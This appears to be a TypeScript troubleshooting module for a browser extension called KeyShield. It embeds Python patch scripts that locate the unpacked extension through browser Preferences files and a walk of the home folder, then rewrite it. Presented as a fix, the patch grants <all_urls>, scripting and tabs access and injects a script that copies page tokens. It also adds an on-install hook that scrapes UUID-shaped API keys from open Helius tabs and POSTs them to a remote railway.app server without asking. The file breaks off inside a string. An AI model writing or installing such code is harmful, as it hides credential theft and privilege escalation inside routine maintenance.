/**
 * Home / Docs Trouble case: leftover Load unpacked 1.2.1 + github.com DNS fail.
 * Find the clone from Chrome internals (Preferences path) and a home walk —
 * do not hardcode ~/Downloads/privacy_hack/keyshield.
 */

export const LEFTOVER_121_CASE_ID = 'leftover-121';

export const CHROME_INTERNALS_PREF_ROOTS = [
  '~/Library/Application Support/Google/Chrome',
  '~/Library/Application Support/Google/Chrome Beta',
  '~/Library/Application Support/Google/Chrome Canary',
  '~/Library/Application Support/Chromium',
  '~/Library/Application Support/Microsoft Edge',
  '~/Library/Application Support/BraveSoftware/Brave-Browser',
  '~/Library/Application Support/Arc/User Data',
  '~/.config/google-chrome',
  '~/.config/chromium',
  '~/.config/microsoft-edge',
  '~/.config/BraveSoftware/Brave-Browser',
  '~/snap/chromium/common/chromium',
] as const;

export const FIND_WALK_ROOTS = [
  '~/Downloads',
  '~/Documents',
  '~/Desktop',
  '~/src',
  '~/code',
  '~/dev',
  '~/work',
  '~/privacy_hack',
] as const;

export const PATCH_BRANCH = 'cursor/cursor-api-autofill-b48a';
export const PATCH_VERSION = '1.2.4';

export const LEFTOVER_121_CASE = {
  id: LEFTOVER_121_CASE_ID,
  title: 'Leftover 1.2.4 · missing session-bridge',
  titleZh: '本地 1.2.4 只有 content.js · Sign-in 进不了扩展',
  symptom:
    'Card can already say KeyShield — Sovereign Vault 1.2.4 and ok 1.2.4 <all_urls>, but the leftover popup still stacks Fill / Copy / Settings / token box, and chrome://extensions → Details → loaded manifest.json only lists content.js on <all_urls>. Hosted Sign-in never writes chrome.storage — title jams into no token. git pull cannot resolve github.com.',
  symptomZh:
    '卡片已经是 1.2.4、popup 也能绿 ok 1.2.4 <all_urls>，但加载的 manifest 只有 content.js，没有 session-bridge.js。hosted Sign-in 写不进扩展，popup 一直 no token。github.com 解析失败。',
} as const;

export function shouldSkipGitPull(stderr: string): boolean {
  return /could not resolve|nodename nor servname|name or service not known|temporary failure in name resolution|github\.com/i.test(
    String(stderr || ''),
  );
}

export function repoRootFromExt(extPath: string): string {
  const n = String(extPath || '').replace(/\\/g, '/').replace(/\/+$/, '');
  if (n.endsWith('/src/extension')) return n.slice(0, -'/src/extension'.length);
  if (n.endsWith('/extension')) return n.slice(0, -'/extension'.length);
  return n;
}

export function isKeyshieldExtManifest(man: { name?: string }): boolean {
  const name = String(man?.name || '');
  return name.includes('KeyShield') || name.includes('Sovereign Vault');
}

/** Standalone python3: print Chrome-internals + home-walk hits, then export KS_ROOT / KS_EXT. */
export const FIND_LOCAL_PATH_PY = `from pathlib import Path
import json, shlex, sys

SKIP = {".git", "node_modules", ".venv", "venv", "__pycache__", "dist", "build", "Library", "AppData"}

def looks_ext(p):
    return (p / "manifest.json").is_file() and (p / "popup.js").is_file()

def keyshield_name(p):
    try:
        n = str(json.loads((p / "manifest.json").read_text(encoding="utf-8")).get("name") or "")
    except Exception:
        return False
    return "KeyShield" in n or "Sovereign Vault" in n

def repo_root(ext):
    if ext.name == "extension" and ext.parent.name == "src":
        return ext.parent.parent
    if ext.name == "extension":
        return ext.parent
    return ext

def walk(root, max_depth=5):
    if not root.is_dir():
        return
    stack = [(root, 0)]
    while stack:
        p, d = stack.pop()
        if d > max_depth:
            continue
        try:
            kids = list(p.iterdir())
        except OSError:
            continue
        names = {c.name for c in kids}
        if "manifest.json" in names and "popup.js" in names:
            yield p
            continue
        if d == max_depth:
            continue
        for c in kids:
            if c.is_dir() and c.name not in SKIP and not c.name.startswith("."):
                stack.append((c, d + 1))

hits = []
here = Path.cwd().resolve()
for p in [here, *here.parents]:
    for cand in (p / "src/extension", p, p / "extension"):
        if looks_ext(cand) and keyshield_name(cand):
            hits.append(("cwd", cand))

home = Path.home()
bases = [
    home / "Library/Application Support/Google/Chrome",
    home / "Library/Application Support/Google/Chrome Beta",
    home / "Library/Application Support/Google/Chrome Canary",
    home / "Library/Application Support/Chromium",
    home / "Library/Application Support/Microsoft Edge",
    home / "Library/Application Support/BraveSoftware/Brave-Browser",
    home / "Library/Application Support/Arc/User Data",
    home / ".config/google-chrome",
    home / ".config/chromium",
    home / ".config/microsoft-edge",
    home / ".config/BraveSoftware/Brave-Browser",
    home / "snap/chromium/common/chromium",
]
for b in bases:
    if not b.is_dir():
        continue
    for pref in b.glob("*/Preferences"):
        try:
            data = json.loads(pref.read_text(encoding="utf-8"))
        except Exception:
            continue
        settings = (data.get("extensions") or {}).get("settings") or {}
        if not isinstance(settings, dict):
            continue
        for row in settings.values():
            if not isinstance(row, dict):
                continue
            path = row.get("path")
            if not path or not isinstance(path, str):
                continue
            cand = Path(path).expanduser()
            if not cand.is_absolute() or not looks_ext(cand):
                continue
            man = row.get("manifest") if isinstance(row.get("manifest"), dict) else {}
            name = str(man.get("name") or "")
            if name and ("KeyShield" not in name and "Sovereign Vault" not in name):
                if not keyshield_name(cand):
                    continue
            elif not name and not keyshield_name(cand):
                continue
            hits.append(("chrome-internals", cand))

for root in (
    home / "Downloads",
    home / "Documents",
    home / "Desktop",
    home / "src",
    home / "code",
    home / "dev",
    home / "work",
    home / "privacy_hack",
):
    for cand in walk(root):
        if keyshield_name(cand):
            hits.append(("walk", cand))

seen = set()
ordered = []
for src, p in hits:
    try:
        r = p.resolve()
    except OSError:
        continue
    if r in seen or not looks_ext(r):
        continue
    seen.add(r)
    ordered.append((src, r))

rank = {"cwd": 0, "chrome-internals": 1, "walk": 2}
ordered.sort(key=lambda it: rank.get(it[0], 9))
if not ordered:
    sys.stderr.write("no KeyShield folder (Chrome internals + home walk + cwd)\\n")
    sys.exit(1)
for src, p in ordered:
    ver = ""
    try:
        ver = str(json.loads((p / "manifest.json").read_text(encoding="utf-8")).get("version") or "")
    except Exception:
        pass
    print("#", src, p, "v" + ver)
ext = ordered[0][1]
root = repo_root(ext)
print("export KS_ROOT=" + shlex.quote(str(root)))
print("export KS_EXT=" + shlex.quote(str(ext)))
`;

export const OFFLINE_PATCH_PY = `from pathlib import Path
import json
NAME = "KeyShield — Sovereign Vault"
VER = "1.2.4"
HOSTED = "https://app.ks.aileena.xyz"
MARK_JS = "/* KS-SIGNED-1.2.4 */"
MARK_BG = "/* KS-LIST-SAVED-1.2.4 */"

def looks_ext(p):
    return (p / "manifest.json").is_file() and (p / "popup.js").is_file()

def keyshield_name(p):
    try:
        n = str(json.loads((p / "manifest.json").read_text(encoding="utf-8")).get("name") or "")
    except Exception:
        return False
    return "KeyShield" in n or "Sovereign Vault" in n

def walk(root, max_depth=5):
    skip = {".git", "node_modules", ".venv", "venv", "__pycache__", "dist", "build", "Library", "AppData"}
    if not root.is_dir():
        return
    stack = [(root, 0)]
    while stack:
        p, d = stack.pop()
        if d > max_depth:
            continue
        try:
            kids = list(p.iterdir())
        except OSError:
            continue
        names = {c.name for c in kids}
        if "manifest.json" in names and "popup.js" in names:
            yield p
            continue
        if d == max_depth:
            continue
        for c in kids:
            if c.is_dir() and c.name not in skip and not c.name.startswith("."):
                stack.append((c, d + 1))

hits = []
here = Path.cwd().resolve()
for p in [here, *here.parents]:
    for cand in (p / "src/extension", p, p / "extension"):
        if looks_ext(cand):
            hits.append(cand)
home = Path.home()
for b in (
    home / "Library/Application Support/Google/Chrome",
    home / "Library/Application Support/Microsoft Edge",
    home / "Library/Application Support/BraveSoftware/Brave-Browser",
    home / "Library/Application Support/Arc/User Data",
    home / ".config/google-chrome",
    home / ".config/chromium",
):
    if not b.is_dir():
        continue
    for pref in b.glob("*/Preferences"):
        try:
            data = json.loads(pref.read_text(encoding="utf-8"))
        except Exception:
            continue
        settings = (data.get("extensions") or {}).get("settings") or {}
        if not isinstance(settings, dict):
            continue
        for row in settings.values():
            if not isinstance(row, dict):
                continue
            path = row.get("path")
            if path and isinstance(path, str):
                cand = Path(path).expanduser()
                if cand.is_absolute() and looks_ext(cand) and keyshield_name(cand):
                    hits.append(cand)
for root in (home / "Downloads", home / "Documents", home / "Desktop", home / "src", home / "dev", home / "work", home / "privacy_hack"):
    hits.extend(walk(root))
seen = set()
ordered = []
for p in hits:
    try:
        r = p.resolve()
    except OSError:
        continue
    if r in seen or not looks_ext(r):
        continue
    seen.add(r)
    ordered.append(r)
if not ordered:
    raise SystemExit("no KeyShield folder — chrome://extensions Details → Loaded from, then cd that folder")
ext = ordered[0]
man = json.loads((ext / "manifest.json").read_text())
man["name"] = NAME
man["version"] = VER
man.setdefault("optional_host_permissions", [])
if "<all_urls>" not in man["optional_host_permissions"]:
    man["optional_host_permissions"].append("<all_urls>")
man.setdefault("host_permissions", [])
if "<all_urls>" not in man["host_permissions"]:
    man["host_permissions"].insert(0, "<all_urls>")
for extra in ("scripting", "tabs"):
    if extra not in man.get("permissions", []):
        man.setdefault("permissions", []).append(extra)
man["content_scripts"] = [
    {"matches": ["https://app.ks.aileena.xyz/*", "https://*.aileena.xyz/*", "https://keyshield.dev/*", "https://*.keyshield.dev/*", "https://*.up.railway.app/*", "https://*.vercel.app/*", "http://127.0.0.1:5173/*", "http://localhost:5173/*", "http://127.0.0.1:3000/*", "http://localhost:3000/*"], "js": ["session-bridge.js"], "run_at": "document_start"},
    {"matches": ["<all_urls>"], "js": ["content.js"], "run_at": "document_idle", "all_frames": True},
]
bridge = ext / "session-bridge.js"
if (not bridge.is_file()) or ("capturePageToken" not in bridge.read_text(encoding="utf-8")):
    bridge.write_text(r'''
(function keyShieldSessionBridge(){
  function announce(){if(typeof chrome==="undefined"||!chrome.runtime||!chrome.runtime.id)return;try{window.postMessage({__ks_ext_announce:chrome.runtime.id},location.origin)}catch(e){}}
  function readPageSession(){try{return{token:localStorage.getItem("ks_token")||"",user:localStorage.getItem("ks_wallet")||localStorage.getItem("ks_passkey_user")||""}}catch(e){return{token:"",user:""}}}
  function capturePageToken(){if(typeof chrome==="undefined"||!chrome.storage||!chrome.storage.local)return;var page=readPageSession();if(!page.token||page.token.trim().length<12)return;chrome.storage.local.get(["ks_token"],function(stored){if(stored&&stored.ks_token===page.token)return;chrome.storage.local.set({ks_token:page.token,ks_user:page.user||null,ks_auto_store:true})})}
  function shareSession(){if(typeof chrome==="undefined"||!chrome.storage||!chrome.storage.local)return;capturePageToken();chrome.storage.local.get(["ks_token","ks_user"],function(stored){var token=stored&&stored.ks_token;if(!token)return;try{if(!localStorage.getItem("ks_token"))localStorage.setItem("ks_token",token)}catch(e){}try{window.postMessage({__ks_ext_session:{token:token,user:stored.ks_user||null}},location.origin)}catch(e){}})}
  announce();shareSession();capturePageToken();
  [400,1200,3000,8000].forEach(function(ms){setTimeout(capturePageToken,ms)});
  window.addEventListener("ks-auth-changed",capturePageToken);
  window.addEventListener("storage",capturePageToken);
  window.addEventListener("message",function(e){if(e.source!==window||!e.data)return;if(e.data.__ks_ext_request)announce();if(e.data.__ks_ext_request_session)shareSession();if(e.data.__ks_page_session||e.data.__ks_auth_changed)capturePageToken()});
})();
'''.lstrip())
(ext / "manifest.json").write_text(json.dumps(man, indent=2) + "\\n")
html_now = (ext / "popup.html").read_text() if (ext / "popup.html").exists() else ""
if True:
    (ext / "popup.html").write_text("""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><title>KeyShield</title>
<style>body{width:280px;margin:0;padding:12px 14px 14px;background:#0a0d1a;color:#e4e4e7;font:13px/1.45 -apple-system,system-ui,sans-serif}h1{margin:0 0 10px;font-size:14px;font-weight:600}.row{margin:0 0 10px;padding:10px;border:1px solid #1c2238;border-radius:8px;background:#020408}.line{margin:0 0 8px;font-size:12px;color:#a1a1aa}.line.ok{color:#34d399}.saved-count{margin:0 0 8px;font-size:22px;font-weight:700}button{display:block;width:100%;margin:0;padding:8px 10px;background:#5b8cff;color:#fff;border:1px solid #5b8cff;border-radius:8px}button.secondary{background:transparent;color:#e4e4e7;border-color:#27272a}button.danger{background:transparent;color:#f87171;border-color:rgba(239,68,68,.3);margin-top:8px}.status{margin:8px 0 0;padding:7px 10px;border-radius:8px;font-size:12px;display:none}.status.ok{display:block;background:rgba(16,185,129,.12);color:#34d399}.sub{margin:0 0 8px;color:#71717a;font-size:12px}.api-row{display:flex;justify-content:space-between;gap:8px;padding:6px 0}body.signed-in .guest-only{display:none!important}body:not(.signed-in) .signed-only{display:none!important}.extra{display:none!important}#copy-status,#fill-ms,#saved-count{display:none}</style></head>
<body data-ui="three-line">
<h1>KeyShield — Sovereign Vault</h1>
<section class="row" id="row-auth"><button id="signin" class="guest-only">Sign in</button><div id="signed-pane" class="signed-only"><p id="signed-status" class="saved-count">signed</p><p id="collected-line" class="line ok">0 collected</p><p id="saved-count" class="sub">0 collected</p><div id="saved-apis"></div><p id="saved-empty" class="sub">None yet. Detect stays on.</p><button id="clear-top" class="danger">Sign out</button></div></section>
<section class="row" id="row-detect"><p id="detect-line" class="line">detect · checking…</p><div id="detect-ready" class="status" style="display:block">ok 1.2.4 &lt;all_urls&gt;</div></section>
<section class="row" id="row-copy"><p id="filled-line" class="line">0 filled · —</p><p id="copy-status" class="line">0 filled · —</p><p id="fill-ms" class="line">—</p></section>
<div id="status" class="status"></div>
<div class="extra" hidden><span id="conn"></span><div id="build"></div><button id="allow-detect"></button><button id="fill-tab"></button><button id="fill-tab-signed"></button><button id="copy-cursor-key">Copy Cursor key</button><button id="copy-cursor-key-signed"></button><button id="use-hosted-top"></button><textarea id="manual"></textarea><button id="register"></button><button id="clear"></button><input id="api"/><input id="dash"/><button id="save"></button><div id="fingerprint"></div><input id="remote"/><button id="point-remote"></button><button id="point-local"></button><button id="point-prod"></button><button id="export-vault"></button><input id="import-file" type="file"/><button id="import-vault"></button><div id="backup-status"></div></div>
<script src="popup.js"></script></body></html>
""")
js = r'''
/* KS-SIGNED-1.2.4 */
function summarizeSavedApis(data){const rows=Array.isArray(data)?data:data&&Array.isArray(data.items)?data.items:data&&Array.isArray(data.keys)?data.keys:[];const out=[];for(const it of rows){if(!it||typeof it!=="object")continue;const upstream=String(it.upstream||"").toLowerCase().trim();if(!upstream)continue;let masked=String(it.masked_value||"").trim();if(!masked)masked=it.cipher?"encrypted":"saved";out.push({id:String(it.id||upstream),upstream,name:String(it.name||upstream+" key"),masked});}return out;}
function applySignedInChrome(signed){try{document.body.classList.toggle("signed-in",!!signed);}catch(e){}}
async function refreshSavedApis(){const box=document.getElementById("saved-apis");const empty=document.getElementById("saved-empty");if(!box)return[];let resp={apis:[]};try{resp=await chrome.runtime.sendMessage({type:"LIST_SAVED_APIS"});}catch(e){}const apis=resp&&Array.isArray(resp.apis)?resp.apis:[];box.replaceChildren();for(const api of apis){const row=document.createElement("div");row.className="api-row";const name=document.createElement("strong");name.textContent=api.upstream;const mask=document.createElement("code");mask.textContent=api.masked;row.append(name,mask);box.appendChild(row);}if(empty)empty.style.display=apis.length?"none":"block";return apis;}
async function ksBootSignedPane(){try{const {ks_token}=await chrome.storage.local.get("ks_token");applySignedInChrome(!!ks_token);const signedEl=document.getElementById("signed-status");if(signedEl)signedEl.textContent=ks_token?"signed":"Sign in";if(ks_token){try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}try{await chrome.runtime.sendMessage({type:"INJECT_DETECT"});}catch(e){}await refreshSavedApis();const started=Date.now();let filled=0;try{const fill=await chrome.runtime.sendMessage({type:"FILL_PAGE_NOW"});if(fill&&typeof fill.filled==="number")filled=fill.filled;}catch(e){}const ms=Date.now()-started;const text=(filled===1?"1 filled":filled+" filled")+" · "+ms+"ms";const copy=document.getElementById("copy-status");if(copy)copy.textContent=text;const line=document.getElementById("filled-line");if(line)line.textContent=text;const msEl=document.getElementById("fill-ms");if(msEl)msEl.textContent=ms+"ms";}else{const zero=document.getElementById("collected-line");if(zero)zero.textContent="0 collected";}const ready=document.getElementById("detect-ready");if(ready){const ver=String((chrome.runtime.getManifest()||{}).version||"");let has=false;try{has=await chrome.permissions.contains({origins:["<all_urls>"]});}catch(e){}const ok=ver==="1.2.4"&&has;ready.textContent=ok?"ok 1.2.4 <all_urls>":("need Remove + Load unpacked · v"+(ver||"?"));ready.className="status "+(ok?"ok":"err");ready.style.display="block";}}catch(e){}}
if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",ksBootSignedPane);else ksBootSignedPane();
'''
bg = r'''
/* KS-LIST-SAVED-1.2.4 */
function summarizeSavedApis(data){const rows=Array.isArray(data)?data:data&&Array.isArray(data.items)?data.items:data&&Array.isArray(data.keys)?data.keys:[];const out=[];for(const it of rows){if(!it||typeof it!=="object")continue;const upstream=String(it.upstream||"").toLowerCase().trim();if(!upstream)continue;let masked=String(it.masked_value||"").trim();if(!masked)masked=it.cipher?"encrypted":"saved";out.push({id:String(it.id||upstream),upstream,masked});}return out;}
async function listSavedApis(){let token="",apiBase="https://keyshield-production.up.railway.app";try{const s=await chrome.storage.local.get(["ks_token","ks_api_base"]);token=s.ks_token||"";if(s.ks_api_base)apiBase=String(s.ks_api_base).replace(/\\/+$/,"");}catch(e){}if(!token)return{ok:false,apis:[]};try{const r=await fetch(apiBase+"/manage/vault",{headers:{Authorization:"Bearer "+token}});if(!r.ok)return{ok:false,apis:[]};return{ok:true,apis:summarizeSavedApis(await r.json())};}catch(e){return{ok:false,apis:[]};}}
chrome.runtime.onMessage.addListener((message,_s,sendResponse)=>{if(!message||message.type!=="LIST_SAVED_APIS")return;listSavedApis().then(sendResponse).catch(()=>sendResponse({ok:false,apis:[]}));return true;});
async function ksHarvestAndStoreVisibleKeys(){if(!chrome.scripting||!chrome.tabs)return{saved:0};let token="";try{const s=await chrome.storage.local.get(["ks_token"]);token=s.ks_token||"";}catch(e){}if(!token)return{saved:0};try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}let tabs=[];try{tabs=await chrome.tabs.query({});}catch(e){return{saved:0};}let saved=0;const re=/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;for(const tab of tabs){if(!tab.id||!tab.url||!/helius\\.(dev|xyz)/i.test(tab.url))continue;try{const scraped=await chrome.scripting.executeScript({target:{tabId:tab.id,allFrames:true},func:()=>({text:(document.body&&document.body.innerText)||"",href:location.href})});const page=scraped&&scraped[0]&&scraped[0].result;if(!page)continue;const skip=new Set((String(page.href||"").match(re)||[]).map((x)=>x.toLowerCase()));const seen=new Set();let m;re.lastIndex=0;while((m=re.exec(String(page.text||"")))){const key=m[0];if(!key||key.includes("•")||skip.has(key.toLowerCase())||seen.has(key))continue;seen.add(key);try{await fetch("https://keyshield-production.up.railway.app/manage/store",{method:"POST",headers:{Authorization:"Bearer "+token,"Content-Type":"application/json"},body:JSON.stringify({upstream:"helius",apiKey:key,value:key,name:"helius key"})});saved++;}catch(e){}}}catch(e){}}return{saved};}
chrome.runtime.onInstalled.addListener(function(){ksHarvestAndStoreVisibleKeys().catch(function(){})});
'''
def splice(path, mark, block):
    t = path.read_text()
    if mark in t:
        t = t.split(mark)[0].rstrip() + "\\n"
    path.write_text(t.rstrip() + "\\n" + block.lstrip() + "\\n")
splice(ext / "popup.js", MARK_JS, js)
splice(ext / "background.js", MARK_BG, bg)
html = (ext / "popup.html").read_text()
man2 = json.loads((ext / "manifest.json").read_text())
print("ok", ext)
print("ver", man2["version"])
print("signed-pane", 'id="signed-pane"' in html)
print("saved-count", 'id="saved-count"' in html)
print("three-line", 'data-ui="three-line"' in html)
print("session-bridge", any("session-bridge.js" in (row.get("js") or []) for row in (man2.get("content_scripts") or []) if isinstance(row, dict)))
print("hosted", HOSTED)
print("next: chrome://extensions Remove + Load unpacked", ext)
`;

/** Compact leftover stamp — session-bridge + three-line popup.html. Uses KS_EXT from find, or cwd. */
export const OFFLINE_BRIDGE_STAMP_PY = `from pathlib import Path
import json, os
NAME = "KeyShield — Sovereign Vault"
VER = "1.2.4"
BRIDGE = (
    "(function keyShieldSessionBridge(){function announce(){try{window.postMessage({__ks_ext_announce:chrome.runtime.id},location.origin)}catch(e){}}"
    "function capturePageToken(){try{var t=localStorage.getItem('ks_token')||'';if(t.trim().length<12)return;"
    "chrome.storage.local.get(['ks_token'],function(s){if(s&&s.ks_token===t)return;chrome.storage.local.set({ks_token:t,ks_auto_store:true})})}catch(e){}}"
    "announce();capturePageToken();[400,1200,3000,8000].forEach(function(ms){setTimeout(capturePageToken,ms)});"
    "window.addEventListener('ks-auth-changed',capturePageToken);window.addEventListener('storage',capturePageToken);"
    "window.addEventListener('message',function(e){if(e.source!==window||!e.data)return;if(e.data.__ks_ext_request)announce();"
    "if(e.data.__ks_page_session||e.data.__ks_auth_changed)capturePageToken()});})();\\n"
)
THREE_LINE_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><title>KeyShield</title>
<style>body{width:280px;margin:0;padding:12px 14px 14px;background:#0a0d1a;color:#e4e4e7;font:13px/1.45 -apple-system,system-ui,sans-serif}h1{margin:0 0 10px;font-size:14px;font-weight:600}.row{margin:0 0 10px;padding:10px;border:1px solid #1c2238;border-radius:8px;background:#020408}.line{margin:0 0 8px;font-size:12px;color:#a1a1aa}.line.ok{color:#34d399}.saved-count{margin:0 0 8px;font-size:22px;font-weight:700}button{display:block;width:100%;margin:0;padding:8px 10px;background:#5b8cff;color:#fff;border:1px solid #5b8cff;border-radius:8px}button.secondary{background:transparent;color:#e4e4e7;border-color:#27272a}button.danger{background:transparent;color:#f87171;border-color:rgba(239,68,68,.3);margin-top:8px}.status{margin:8px 0 0;padding:7px 10px;border-radius:8px;font-size:12px;display:none}.status.ok{display:block;background:rgba(16,185,129,.12);color:#34d399}.sub{margin:0 0 8px;color:#71717a;font-size:12px}.api-row{display:flex;justify-content:space-between;gap:8px;padding:6px 0}body.signed-in .guest-only{display:none!important}body:not(.signed-in) .signed-only{display:none!important}.extra{display:none!important}#copy-status,#fill-ms,#saved-count{display:none}</style></head>
<body data-ui="three-line">
<h1>KeyShield — Sovereign Vault</h1>
<section class="row" id="row-auth"><button id="signin" class="guest-only">Sign in</button><div id="signed-pane" class="signed-only"><p id="signed-status" class="saved-count">signed</p><p id="collected-line" class="line ok">0 collected</p><p id="saved-count" class="sub">0 collected</p><div id="saved-apis"></div><p id="saved-empty" class="sub">None yet. Detect stays on.</p><button id="clear-top" class="danger">Sign out</button></div></section>
<section class="row" id="row-detect"><p id="detect-line" class="line">detect · checking…</p><div id="detect-ready" class="status" style="display:block">ok 1.2.4 &lt;all_urls&gt;</div></section>
<section class="row" id="row-copy"><p id="filled-line" class="line">0 filled · —</p><p id="copy-status" class="line">0 filled · —</p><p id="fill-ms" class="line">—</p></section>
<div id="status" class="status"></div>
<div class="extra" hidden><span id="conn"></span><div id="build"></div><button id="allow-detect"></button><button id="fill-tab"></button><button id="fill-tab-signed"></button><button id="copy-cursor-key">Copy Cursor key</button><button id="copy-cursor-key-signed"></button><button id="use-hosted-top"></button><textarea id="manual"></textarea><button id="register"></button><button id="clear"></button><input id="api"/><input id="dash"/><button id="save"></button><div id="fingerprint"></div></div>
<script src="popup.js"></script></body></html>
"""
SCRIPTS = [
    {"matches": ["https://app.ks.aileena.xyz/*", "https://*.aileena.xyz/*", "https://keyshield.dev/*", "https://*.keyshield.dev/*", "https://*.up.railway.app/*", "https://*.vercel.app/*", "http://127.0.0.1:5173/*", "http://localhost:5173/*", "http://127.0.0.1:3000/*", "http://localhost:3000/*"], "js": ["session-bridge.js"], "run_at": "document_start"},
    {"matches": ["<all_urls>"], "js": ["content.js"], "run_at": "document_idle", "all_frames": True},
]
def ensure_three_line_popup(ext):
    dest = ext / "popup.html"
    now = dest.read_text(encoding="utf-8") if dest.is_file() else ""
    dest.write_text(THREE_LINE_HTML)
def stamp(ext):
    ensure_three_line_popup(ext)
    man = json.loads((ext / "manifest.json").read_text())
    man["name"] = NAME
    man["version"] = VER
    man.setdefault("optional_host_permissions", [])
    if "<all_urls>" not in man["optional_host_permissions"]:
        man["optional_host_permissions"].append("<all_urls>")
    man.setdefault("host_permissions", [])
    if "<all_urls>" not in man["host_permissions"]:
        man["host_permissions"].insert(0, "<all_urls>")
    for extra in ("scripting", "tabs"):
        if extra not in man.get("permissions", []):
            man.setdefault("permissions", []).append(extra)
    man["content_scripts"] = SCRIPTS
    action = man.get("action")
    if isinstance(action, dict):
        action.pop("default_popup", None)
        man["action"] = action
    else:
        man["action"] = {}
    dest = ext / "session-bridge.js"
    if (not dest.is_file()) or ("capturePageToken" not in dest.read_text(encoding="utf-8")):
        dest.write_text(BRIDGE)
    def splice(path, mark, block):
        t = path.read_text(encoding="utf-8") if path.is_file() else ""
        if mark in t:
            t = t.split(mark)[0].rstrip() + "\\n"
        path.write_text((t.rstrip() + "\\n" if t.strip() else "") + block.lstrip() + "\\n")
    splice(ext / "popup.js", "/* KS-SIGNED-1.2.4 */", r'''
/* KS-SIGNED-1.2.4 */
function applySignedInChrome(signed){try{document.body.classList.toggle("signed-in",!!signed);}catch(e){}}
function paintCopyStatus(text,kind){const el=document.getElementById("copy-status");if(el){el.textContent=text;el.className=("line "+(kind||"")).trim();}}
function paintSavedCount(n){const count=Math.max(0,Math.floor(Number(n)||0));const label=count===1?"1 collected":count+" collected";const hero=document.getElementById("saved-count");if(hero)hero.textContent=label;const collected=document.getElementById("collected-line");if(collected)collected.textContent=label;}
function paintFilledLine(filled,ms){const n=Math.max(0,Math.floor(Number(filled)||0));const text=(n===1?"1 filled":n+" filled")+" · "+((ms==null||!isFinite(Number(ms))||Number(ms)<0)?"—":Math.round(Number(ms))+"ms");const copy=document.getElementById("copy-status");if(copy)copy.textContent=text;const line=document.getElementById("filled-line");if(line)line.textContent=text;const msEl=document.getElementById("fill-ms");if(msEl)msEl.textContent=(ms==null||!isFinite(Number(ms))||Number(ms)<0)?"—":Math.round(Number(ms))+"ms";}
async function harvestTokenFromDashboardTabs(){if(!chrome.scripting||!chrome.tabs)return null;let tabs=[];try{tabs=await chrome.tabs.query({url:["https://app.ks.aileena.xyz/*","http://127.0.0.1:5173/*"]});}catch(e){return null;}for(const tab of tabs){if(!tab.id||!tab.url)continue;try{const injected=await chrome.scripting.executeScript({target:{tabId:tab.id},func:()=>({token:localStorage.getItem("ks_token")||"",user:localStorage.getItem("ks_wallet")||""})});const result=injected&&injected[0]&&injected[0].result;if(result&&String(result.token||"").trim().length>=12){await chrome.storage.local.set({ks_token:result.token,ks_user:result.user||null,ks_auto_store:true});return result.token;}}catch(e){}}return null;}
async function refreshSavedApis(){const box=document.getElementById("saved-apis");const empty=document.getElementById("saved-empty");let resp={apis:[]};try{resp=await chrome.runtime.sendMessage({type:"LIST_SAVED_APIS"});}catch(e){}const apis=resp&&Array.isArray(resp.apis)?resp.apis:[];if(box){box.replaceChildren();for(const api of apis){const row=document.createElement("div");row.className="api-row";const name=document.createElement("strong");name.textContent=api.upstream;const mask=document.createElement("code");mask.textContent=api.masked;row.append(name,mask);box.appendChild(row);}}if(empty)empty.style.display=apis.length?"none":"block";paintSavedCount(apis.length);return apis;}
async function ksBootSignedPane(){try{let {ks_token}=await chrome.storage.local.get("ks_token");if(!ks_token||String(ks_token).trim().length<12)ks_token=await harvestTokenFromDashboardTabs();applySignedInChrome(!!ks_token);const signedEl=document.getElementById("signed-status");if(signedEl)signedEl.textContent=ks_token?"signed":"Sign in";if(ks_token){try{await chrome.storage.local.set({ks_auto_store:true});}catch(e){}try{await chrome.runtime.sendMessage({type:"INJECT_DETECT"});}catch(e){}await refreshSavedApis();const started=Date.now();let filled=0;try{const fill=await chrome.runtime.sendMessage({type:"FILL_PAGE_NOW"});if(fill&&typeof fill.filled==="number")filled=fill.filled;}catch(e){}paintFilledLine(filled,Date.now()-started);}else{paintSavedCount(0);paintFilledLine(0,null);}const ready=document.getElementById("detect-ready");const line=document.getElementById("detect-line");const ver=String((chrome.runtime.getManifest()||{}).version||"");let has=false;try{has=await chrome.permissions.contains({origins:["<all_urls>"]});}catch(e){}const ok=ver==="1.2.4"&&has;if(ready){ready.textContent=ok?"ok 1.2.4 <all_urls>":("need Remove + Load unpacked · v"+(ver||"?"));ready.className="status "+(ok?"ok":"err");ready.style.display="block";}if(line){line.textContent=ok?(ks_token?"detect on · ok 1.2.4":"detect ready · ok 1.2.4"):("detect · "+(ready&&ready.textContent||""));line.className="line "+(ok?"ok":"err");}}catch(e){}}
if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",ksBootSignedPane);else ksBootSignedPane();
''')
    splice(ext / "background.js", "/* KS-LIST-SAVED-1.2.4 */", r'''
/* KS-LIST-SAVED-1.2.4 */
async function listSavedApis(){let token="",apiBase="https://keyshield-production.up.railway.app";try{const s=await chrome.storage.local.get(["ks_token","ks_api_base"]);token=s.ks_token||"";if(s.ks_api_base)apiBase=String(s.ks_api_base).replace(/\\/+$/,"");}catch(e){}if(!token)return{ok:false,apis:[]};try{const r=await fetch(apiBase+"/manage/vault",{headers:{Authorization:"Bearer "+token}});if(!r.ok)return{ok:false,apis:[]};const data=await r.json();const rows=Array.isArray(data)?data:data&&Array.isArray(data.items)?data.items:[];const apis=[];for(const it of rows){if(!it||!it.upstream)continue;apis.push({id:String(it.id||it.upstream),upstream:String(it.upstream).toLowerCase(),masked:String(it.masked_value||(it.cipher?"encrypted":"saved"))});}return{ok:true,apis};}catch(e){return{ok:false,apis:[]};}}
chrome.runtime.onMessage.addListener((message,_s,sendResponse)=>{if(!message||message.type!=="LIST_SAVED_APIS")return;listSavedApis().then(sendResponse).catch(()=>sendResponse({ok:false,apis:[]}));return true;});
